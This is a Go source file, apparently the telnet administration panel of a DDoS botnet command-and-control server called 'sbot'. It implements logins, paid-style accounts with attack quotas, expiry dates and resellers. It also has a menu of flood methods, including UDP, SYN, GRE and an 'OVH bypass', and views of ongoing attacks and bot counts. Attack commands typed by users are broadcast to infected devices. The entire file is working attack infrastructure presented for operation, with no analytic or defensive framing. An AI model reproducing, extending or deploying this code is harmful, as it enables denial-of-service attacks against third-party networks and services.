package main

import (
	"fmt"
	"log"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"golang.org/x/term"

	"github.com/alexeyco/simpletable"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

var languageMap = map[string]map[string]string{
	"english": {
		"Username":        "Please enter your Username: ",
		"password":        "Please enter your password: ",
		"invalid_login":   "Invalid login attempt. Please try again.",
		"languageChanged": "Language changed successfully.",
		"invalidLanguage": "Invalid language! No changes were made.",
	},
	"russian": {
		"Username":        "Введите ваше имя пользователя: ",
		"password":        "Введите ваш пароль: ",
		"invalid_login":   "Неверная попытка входа. Пожалуйста, попробуйте еще раз.",
		"languageChanged": "Язык успешно изменен.",
		"invalidLanguage": "Недействительный язык! Изменения не были внесены.",
	},
	"chinese": {
		"Username":        "请输入您的用户名: ",
		"password":        "请输入您的密码: ",
		"invalid_login":   "登录尝试无效。请再试一次。",
		"languageChanged": "语言修改成功。",
		"invalidLanguage": "无效的语言！没有进行任何更改。",
	},
}

var previousDistribution map[string]int

func (session *Admin) Handle() {
	session.Printf("\033[?1049h")
	session.Printf("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")

	session.Printf("\033[2J\033[1H")
	err := session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		return
	}
	session.Print("\033[97mSupported: english - russian - chinese\r\n\n")
	session.Print("Language: ")
	language, err := session.ReadLine("", false)
	if err != nil {
		return
	}

	validLanguages := []string{"english", "russian", "chinese"}
	isValid := false
	for _, l := range validLanguages {
		if language == l {
			isValid = true
			break
		}
	}
	if !isValid {
		session.Printf("Could not parse '" + language + "', Using english.\x1b[0m\r\n")
		language = "english"
	}

	// Get Username
	err = session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		return
	}
	username, err := session.ReadLine(languageMap[language]["Username"], false)
	if err != nil {
		return
	}

	// Get password
	err = session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		return
	}
	password, err := session.ReadLine(languageMap[language]["password"], true)
	if err != nil {
		return
	}

	var loggedIn bool
	var userInfo AccountInfo

	loggedIn, userInfo, err = database.TryLogin(username, password, session.conn.RemoteAddr().String())
	if !loggedIn || err != nil {
		log.Printf(LogError + fmt.Sprintf("%s", err))
		switch language {
		case "english":
			session.Printf(languageMap["english"]["invalid_login"])
		case "russian":
			session.Printf(languageMap["russian"]["invalid_login"])
		case "chinese":
			session.Printf(languageMap["chinese"]["invalid_login"])

		}

		buf := make([]byte, 1)
		_, err2 := session.conn.Read(buf)
		if err2 != nil {
			return
		}
		return
	}

	//time.Sleep(1 * time.Second)

	if userInfo.Expiry.Before(time.Now()) {
		session.Println("Account expired!")
		return
	}
	log.Printf(LogWarn + fmt.Sprintf("logged in %s from %s.", username, session.conn.RemoteAddr()))

	err = session.conn.SetDeadline(time.Now().Add(120 * time.Second))
	if err != nil {
		return
	}
	go func() {
		i := 0
		for {
			BotCount := clientList.Count()
			time.Sleep(time.Second)

			var maxAttacksText string

			if userInfo.MaxAttacks == 9999 {
				maxAttacksText = "infinity"
			} else {
				maxAttacksText = fmt.Sprintf("%d", userInfo.MaxAttacks)
			}

			totalAttacks, err := database.GetTotalAttacksForUser(userInfo.ID)
			if err != nil {
				return
			}

			if totalAttacks > userInfo.MaxAttacks {
				totalAttacks = userInfo.MaxAttacks
			}

			title := fmt.Sprintf("%d | %d/%d | attacks: %d/%s",
				BotCount, database.runningatk(), slots, totalAttacks, maxAttacksText)
			time.Sleep(time.Second)
			if _, err := session.conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title))); err != nil {
				err := session.conn.Close()
				if err != nil {
					return
				}
				fmt.Println(err)
				break
			}

			i++
			if i%3 == 0 {
				err := session.conn.SetDeadline(time.Now().Add(120 * time.Second))
				if err != nil {
					return
				}
			}
		}
	}()

	session.Printf("\033[2J\033[1H")

	terminal := term.NewTerminal(session.conn, "")

	for {
		var botCategory string
		var botCount int
		session.Printf("%s@sbot: \x1b[0m", username)
		cmd, err := terminal.ReadLine()
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		cmd = strings.ToLower(cmd)
		if cmd == "" {
			continue
		}

		botCount = userInfo.Bots

		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			switch language {
			case "english":
				session.Printf("\033[2J\033[1H")
			case "russian":
				session.Printf("\033[2J\033[1H")
			case "chinese":
				session.Printf("\033[2J\033[1H")
			}
			continue
		}

		if cmd == "passwd" {
			oldpw, err := session.ReadLine("Current password: ", true)
			if err != nil {
				session.Println("Error reading current password:", err)
				return
			}

			newpw, err := session.ReadLine("New password: ", true)
			if err != nil {
				session.Println("Error reading new password:", err)
				return
			}

			if database.CheckUserPassword(username, oldpw) {
				err := database.UpdatePassword(username, newpw)
				if err != nil {
					fmt.Printf("Error updating password for %s: %s\r\n", username, err)
					return
				}
				session.Println("Password updated successfully.")
			} else {
				session.Println("Invalid current password.")
			}
			continue
		}

		if cmd == "language" {
			session.Println("please select english, russian, chinese (ex. language russian)")
			continue
		}

		if strings.HasPrefix(cmd, "language ") {
			newLang := strings.TrimPrefix(cmd, "language ")
			isValid := false
			for _, l := range validLanguages {
				if newLang == l {
					isValid = true
					break
				}
			}
			if isValid {
				language = newLang
				session.Printf("%s\r\n", languageMap[language]["languageChanged"])
			} else {
				session.Printf("%s\r\n", languageMap[language]["invalidLanguage"])
			}
			continue
		}

		if cmd == "h" || cmd == "help" || cmd == "?" || cmd == "methods" || cmd == "m" || cmd == "meth" {
			session.Println("")
			session.Println("	!udp: Basic UDP flood")
			session.Println("	!vse: Valve Source Engine-specific flood")
			session.Println("	!dns: DNS resolver flood with a specified domain")
			session.Println("	!syn: TCP SYN flood")
			session.Println("	!ack: TCP ACK flood")
			session.Println("	!stomp: TCP handshake and ACK/PSH flood")
			session.Println("	!greip: Generic Routing Encapsulation IP flood")
			session.Println("	!greeth: Generic Routing Encapsulation ETH flood")
			session.Println("	!udpplain: Simplified UDP flood")
			session.Println("	!std: Standard flood")
			session.Println("	!tcp: Mixed TCP flood")
			session.Println("	!ovh: OVH bypass flood")
			session.Println("	!stdhex: Standard flood with custom hex payloads")
			session.Println("	!udprand: UDP flood with randomized payloads")
			session.Println("	!storm: TCP ACK and PSH flood")
			session.Println("")
			continue
		}

		if strings.HasPrefix(cmd, "help ") {
			args := strings.TrimPrefix(cmd, "help ")
			switch args {
			case "-a":
				if userInfo.Admin {
					session.Println("")
					session.Printf("	bots <-a/-l>\r\n")
					session.Printf("	attacks <status/enable/disable/ongoing/logs>\r\n")
					session.Printf("	users <add/remove/edit/list>\r\n")
					session.Println("")
				} else {
					session.Println("You need admin to view this!")
					continue
				}
			default:
				session.Println("")
				session.Println("	!udp: Basic UDP flood")
				session.Println("	!vse: Valve Source Engine-specific flood")
				session.Println("	!dns: DNS resolver flood with a specified domain")
				session.Println("	!syn: TCP SYN flood")
				session.Println("	!ack: TCP ACK flood")
				session.Println("	!stomp: TCP handshake and ACK/PSH flood")
				session.Println("	!greip: Generic Routing Encapsulation IP flood")
				session.Println("	!greeth: Generic Routing Encapsulation ETH flood")
				session.Println("	!udpplain: Simplified UDP flood")
				session.Println("	!std: Standard flood")
				session.Println("	!tcp: Mixed TCP flood")
				session.Println("	!ovh: OVH bypass flood")
				session.Println("	!stdhex: Standard flood with custom hex payloads")
				session.Println("	!udprand: UDP flood with randomized payloads")
				session.Println("	!storm: TCP ACK and PSH flood")
				session.Println("")
			}
			continue
		}

		if userInfo.Admin && cmd == "attacks" {
			if attackstatus {
				session.Printf("Attacks are currently enabled!\r\n")
			} else {
				session.Printf("Attacks are currently disabled!\r\n")
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks ") {
			args := strings.TrimPrefix(cmd, "attacks ")
			if !userInfo.Admin {
				session.Printf("You do not have permission to use this command!\r\n")
			} else {
				switch args {
				case "enable":
					session.Printf("Attacks are now enabled!\r\n")
					attackstatus = true
				case "disable":
					session.Printf("Attacks are now disabled!\r\n")
					attackstatus = false
				case "status":
					if attackstatus {
						session.Printf("Attacks are currently enabled!\r\n")
					} else {
						session.Printf("Attacks are currently disabled!\r\n")
					}
				case "logs":
					attacks, err := database.getAllAttacks()
					if err != nil {
						fmt.Println("Error fetching attack logs:", err)
						return
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "Username"},
							{Align: simpletable.AlignCenter, Text: "Host(s)"},
							{Align: simpletable.AlignCenter, Text: "Port"},
							{Align: simpletable.AlignCenter, Text: "Duration"},
							{Align: simpletable.AlignCenter, Text: "Flood Type"},
							{Align: simpletable.AlignCenter, Text: "Time"},
						},
					}

					for _, attack := range attacks {
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: attack["username"]},
							{Align: simpletable.AlignCenter, Text: attack["host"]},
							{Align: simpletable.AlignCenter, Text: attack["port"]},
							{Align: simpletable.AlignCenter, Text: attack["duration"]},
							{Align: simpletable.AlignCenter, Text: attack["floodType"]},
							{Align: simpletable.AlignCenter, Text: attack["time"]},
						}

						table.Body.Cells = append(table.Body.Cells, r)
					}

					table.SetStyle(simpletable.StyleCompactLite)
					session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
				default:
					session.Printf("Invalid argument for attacks command!\r\n")
				}
			}
			continue
		}

		if cmd == "ongoing" {
			if !userInfo.Admin {
				session.Println("You don't have permission to do this")
				continue
			}

			attacks, err := database.getOngoingAttacks()
			if err != nil {
				// handle error
				fmt.Println("Error fetching ongoing attacks:", err)
				return
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Flood Type"},
					{Align: simpletable.AlignCenter, Text: "Host(s)"},
					{Align: simpletable.AlignCenter, Text: "Port"},
					{Align: simpletable.AlignCenter, Text: "Length"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Started"},
					{Align: simpletable.AlignCenter, Text: "Ended"},
				},
			}

			for _, attack := range attacks {
				if attack["port"] == "" {
					attack["port"] = strconv.Itoa(65535)
				}
				if attack["length"] == "" {
					attack["length"] = strconv.Itoa(512)
				}
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: attack["username"]},
					{Align: simpletable.AlignCenter, Text: attack["floodType"]},
					{Align: simpletable.AlignCenter, Text: attack["host"]},
					{Align: simpletable.AlignCenter, Text: attack["port"]},
					{Align: simpletable.AlignCenter, Text: attack["length"]},
					{Align: simpletable.AlignCenter, Text: attack["duration"]},
					{Align: simpletable.AlignCenter, Text: attack["started"]},
					{Align: simpletable.AlignCenter, Text: attack["ended"]},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
		}

		if cmd == "users" {
			if !userInfo.Admin && !userInfo.Reseller {
				session.Printf("You do not have permission to use this command!\r\n")
				continue
			}

			var users []User

			if userInfo.Admin {
				users, err = database.GetUsers()
			} else {
				users, err = database.GetUsersCreatedBy(username)
			}

			if err != nil {
				session.Printf("Failed to fetch users!\r\n")
				fmt.Println(err)
				continue
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "ID"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Password"},
					{Align: simpletable.AlignCenter, Text: "Duration Limit"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "Max Bots"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Max Attacks"},
					{Align: simpletable.AlignCenter, Text: "Total Attacks"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "Created By"},
				},
			}

			table.Body = &simpletable.Body{}

			for _, user := range users {
				expiryText := "∞"
				if user.Expiry.Valid {
					expiryTime := time.Unix(user.Expiry.Int64, 0)
					if time.Now().After(expiryTime) {
						expiryText = "Expired"
					} else {
						expiryDays := expiryTime.Sub(time.Now()).Hours() / 24
						if expiryDays <= 999999 {
							expiryText = fmt.Sprintf("%.2f days", expiryDays)
						}
					}
				}

				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.ID)},
					{Align: simpletable.AlignRight, Text: user.Username},
					{Align: simpletable.AlignRight, Text: "********"},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.DurationLimit)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.Cooldown)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.MaxBots)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%t", user.Admin)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.MaxAttacks)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.TotalAttacks)},
					{Align: simpletable.AlignRight, Text: expiryText},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%t", user.Reseller)},
					{Align: simpletable.AlignRight, Text: user.CreatedBy},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompact)
			session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			continue
		}

		if userInfo.Admin && cmd == "bots" {
			session.Printf("Please specify -a or -l!\r\n")
			continue
		}

		if strings.HasPrefix(cmd, "bots ") {
			args := strings.TrimPrefix(cmd, "bots ")
			switch args {
			case "-a":
				var BotCount int
				BotCount = clientList.Count()
				session.Printf("Total\u001B[94m: %d\r\n", BotCount)
			case "-l":
				if userInfo.Admin {
					m := clientList.Distribution()

					if previousDistribution != nil {
						for k, v := range m {
							change := v - previousDistribution[k]
							changeSign := ""
							colorCode := "92"
							if change > 0 {
								changeSign = "+"
							} else if change < 0 {
								colorCode = "91"
							}
							session.Printf("%s\u001B[94m: %d (\x1b[%sm%s%d\u001B[94m)\r\n", k, v, colorCode, changeSign, change)
						}
					} else {
						for k, v := range m {
							session.Printf("%s\u001B[94m: %d\r\n", k, v)
						}
					}

					previousDistribution = m
				} else {
					session.Printf("You can't view bot arches!\r\n")
				}
			}
			continue
		}

		atk, err := NewAttack(cmd, userInfo.Admin, false)
		if err != nil {
			session.Println(err.Error())
		} else {
			buf, err := atk.Build()
			if err != nil {
				session.Println(err.Error())
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					session.Println(err.Error())
				} else if !database.ContainsWhitelistedTargets(atk) {
					if userInfo.Bots != -1 {
						botCount = userInfo.Bots
					} else {
						botCount = clientList.Count()
					}
					session.Println(fmt.Sprintf("Command broadcasted to %d devices", botCount))
					err := database.IncreaseTotalAttacks(username)
					if err != nil {
						return
					}
					clientList.QueueBuf(buf, botCount, botCategory)
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}

func parseDuration(input string) (time.Duration, error) {
	var totalDuration time.Duration

	unitMultiplier := map[string]time.Duration{
		"d": time.Hour * 24,
		"h": time.Hour,
		"m": time.Minute,
		"s": time.Second,
	}

	regex := regexp.MustCompile(`(\d+)([dhms])`)
	matches := regex.FindAllStringSubmatch(input, -1)

	for _, match := range matches {
		value, err := strconv.Atoi(match[1])
		if err != nil {
			return 0, err
		}

		multiplier, exists := unitMultiplier[match[2]]
		if !exists {
			return 0, fmt.Errorf("unknown time unit in %s", match[0])
		}

		totalDuration += time.Duration(value) * multiplier
	}

	return totalDuration, nil
}

func (session *Admin) ReadLine(prompt string, masked bool) (string, error) {
	buf := make([]byte, 2048)
	pos := 0

	if len(prompt) >= 1 {
		session.Print(prompt)
	}

	for {
		if len(buf) < pos+2 {
			fmt.Println("BUFF LEN:", len(buf))
			fmt.Println("Prevented Buffer Overflow.", session.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := session.conn.Read(buf[pos : pos+1])
		if err != nil || n != 1 {
			return "", err
		}
		switch buf[pos] {
		case 0xFF:
			n, err := session.conn.Read(buf[pos : pos+2])
			if err != nil || n != 2 {
				return "", err
			}
			pos--
		case 0x7F, 0x08:
			if pos > 0 {
				session.Print("\b \b")
				pos--
			}
			pos--
		case 0x0D, 0x09:
			pos--
		case 0x0A, 0x00:
			session.Print("\r\n")
			return string(buf[:pos]), nil
		case 0x03:
			session.Print("^C")
			return "", nil
		default:
			if buf[pos] == 0x1B {
				buf[pos] = '^'
				session.Print(string(buf[pos]))
				pos++
				buf[pos] = '['
				session.Print(string(buf[pos]))
			} else if masked {
				session.Print("*")
			} else {
				session.Print(string(buf[pos]))
			}
		}
		pos++
	}
}
